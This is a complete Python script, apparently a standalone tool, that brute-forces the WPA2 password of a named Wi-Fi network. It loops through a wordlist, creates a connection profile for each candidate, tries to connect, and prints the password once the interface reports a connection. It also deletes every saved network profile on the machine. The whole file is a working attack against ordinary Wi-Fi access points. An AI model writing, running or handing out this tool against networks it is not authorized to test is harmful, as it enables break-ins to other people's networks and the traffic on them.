import pywifi
from pywifi import const
import time

def wifi_connect(ssid, password):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    iface.disconnect()
    time.sleep(1)

    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)

    iface.connect(tmp_profile)
    time.sleep(5)  # wait for connection

    if iface.status() == const.IFACE_CONNECTED:
        return True
    else:
        return False

def brute_force_wifi(ssid, wordlist_path):
    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            password = line.strip()
            print(f"Trying password: {password}")
            if wifi_connect(ssid, password):
                print(f"Success! Password is: {password}")
                return password
    print("Password not found in wordlist.")
    return None

if __name__ == "__main__":
    target_ssid = input("Enter target SSID: ")
    wordlist_file = input("Enter path to wordlist file: ")
    brute_force_wifi(target_ssid, wordlist_file)
